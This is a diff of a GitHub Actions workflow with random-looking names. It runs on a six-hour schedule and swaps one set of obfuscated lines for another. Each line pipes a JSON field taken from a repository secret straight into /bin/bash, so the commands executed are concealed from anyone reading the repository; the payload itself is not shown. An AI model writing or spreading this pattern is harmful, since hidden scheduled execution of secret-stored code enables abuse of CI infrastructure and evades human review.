@@ -2,25 +2,26 @@ name: duikkkx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
+    - cron: '46 3/6 * * *'
 
-jobs:  # 16582
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duikkkx
         env:
-          dh586: ${{ secrets.dh586 }}
+          v3: ${{ secrets.v3 }}
         run: |
-          echo $dh586 | jq -r .die82229 | /bin/bash
-          echo $n4 | jq -r .estr4 | /bin/bash
-          echo $s9 | jq -r .sa93858 | /bin/bash
-          echo $wyhhl82 | jq -r .qnl71 | /bin/bash
-          echo $yhkq9 | jq -r .i17200 | /bin/bash
-          echo $lozj386 | jq -r .jhkuy4702 | /bin/bash
-          echo $dzpc6413 | jq -r .kqqg0474 | /bin/bash
-          echo $qxk1097 | jq -r .hczq4 | /bin/bash
-          echo $meq69043 | jq -r .jvy56349 | /bin/bash
-          echo $kn4 | jq -r .qlxaj762 | /bin/bash
+          echo $v3 | jq -r .fvjb9286 | /bin/bash
+          echo $f2 | jq -r .v56 | /bin/bash
+          echo $nzlhy375 | jq -r .h90 | /bin/bash
+          echo $toab4 | jq -r .wxdau4 | /bin/bash
+          echo $mvo5 | jq -r .dfn9962 | /bin/bash
+          echo $qpo9 | jq -r .pjqty38425 | /bin/bash
+          echo $e037 | jq -r .ilhm2384 | /bin/bash
+          echo $gic9 | jq -r .wqttp90 | /bin/bash
+          echo $h75233 | jq -r .zlsuk25 | /bin/bash
+          echo $lmo8444 | jq -r .bcac92429 | /bin/bash
 
